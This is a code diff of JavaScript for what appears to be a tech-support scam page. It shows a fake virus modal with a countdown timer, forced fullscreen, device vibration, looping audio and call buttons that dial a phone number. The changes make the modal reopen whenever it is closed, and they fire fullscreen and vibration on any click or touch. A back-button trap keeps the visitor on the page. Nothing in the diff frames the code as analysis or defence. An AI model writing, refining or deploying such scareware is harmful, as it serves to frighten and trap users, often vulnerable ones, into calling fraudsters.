@@ -1,4 +1,5 @@
 $(document).ready(() => {
+  // Countdown timer logic
   function startCountdown() {
     let timeInSeconds = 5 * 60; // 5 minutes in seconds
 
@@ -11,14 +12,10 @@ $(document).ready(() => {
       seconds = seconds < 10 ? "0" + seconds : seconds;
 
       // Update the timer display
-      document.getElementById(
-        "countdown-timer"
-      ).innerText = `${minutes}:${seconds}`;
+      $("#countdown-timer").text(`${minutes}:${seconds}`);
 
-      // Decrease time by 1 second
       timeInSeconds--;
 
-      // When the countdown reaches 0, restart the timer
       if (timeInSeconds < 0) {
         clearInterval(countdown);
         startCountdown(); // Restart the countdown
@@ -33,39 +30,36 @@ $(document).ready(() => {
   const modalInstance = new bootstrap.Modal(virusModal);
   const audioPlayer = $("#audioPlayer")[0];
 
-  // Ensure the audio plays continuously
+  // Ensure audio plays and loops
   function playAudio() {
-    audioPlayer.play().catch(() => {
-      console.log("Audio playback was prevented");
+    audioPlayer.play().catch((error) => {
+      console.error("Audio playback was blocked:", error);
     });
     audioPlayer.addEventListener("ended", () => {
       audioPlayer.play();
     });
   }
 
-  // Function to go fullscreen and show modal
+  // Function to go fullscreen and vibrate
   function goFullScreenAndVibrate() {
-    const element = document.documentElement; // Use the whole document for fullscreen
+    const element = document.documentElement; // Use the entire document for fullscreen
 
     if (element.requestFullscreen) {
       element.requestFullscreen();
     } else if (element.mozRequestFullScreen) {
-      // Firefox
-      element.mozRequestFullScreen();
+      element.mozRequestFullScreen(); // Firefox
     } else if (element.webkitRequestFullscreen) {
-      // Chrome, Safari, and Opera
-      element.webkitRequestFullscreen();
+      element.webkitRequestFullscreen(); // Chrome, Safari, Opera
     } else if (element.msRequestFullscreen) {
-      // IE/Edge
-      element.msRequestFullscreen();
+      element.msRequestFullscreen(); // IE/Edge
     }
 
-    navigator.vibrate(200);
-    playAudio(); // Play audio
+    navigator.vibrate(200); // Vibrate
+    playAudio(); // Play the audio
     modalInstance.show(); // Show the modal
   }
 
-  // Show modal and enter fullscreen on scroll
+  // Automatically show modal on scroll
   let scrolledOnce = false;
   $(window).on("scroll", () => {
     if (!scrolledOnce) {
@@ -74,24 +68,29 @@ $(document).ready(() => {
     }
   });
 
-  // Add event listener for button vibration
-  $("#vibrateButton").on("click", () => {
-    goFullScreenAndVibrate();
+  // Ensure the modal keeps reappearing after being closed
+  if (virusModal) {
+    virusModal.addEventListener("hidden.bs.modal", () => {
+      setTimeout(() => {
+        modalInstance.show(); // Reopen modal
+        goFullScreenAndVibrate(); // Trigger fullscreen and vibrate
+      }, 300); // Delay of 0.3 seconds
+    });
+  }
+
+  // Handle touchstart and click events to trigger fullscreen
+  $(window).on("touchstart click", () => {
+    playAudio(); // Play audio
+    goFullScreenAndVibrate(); // Ensure fullscreen and vibration
   });
 
-  // Add event listener for call buttons
+  // Call button functionality
   $("#callButton, #callButton1, #callButton2").on("click", function () {
     const phoneNumber = "tel:+18778381219";
     window.location.href = phoneNumber;
   });
 
-  // Prevent the backspace key from navigating back.
+  // Prevent backspace key from navigating back
   history.pushState(null, null, window.location.href);
-  history.back();
   window.onpopstate = () => history.forward();
-
-  // Ensure audio starts on interaction
-  $(window).on("touchstart click", () => {
-    playAudio();
-  });
 });
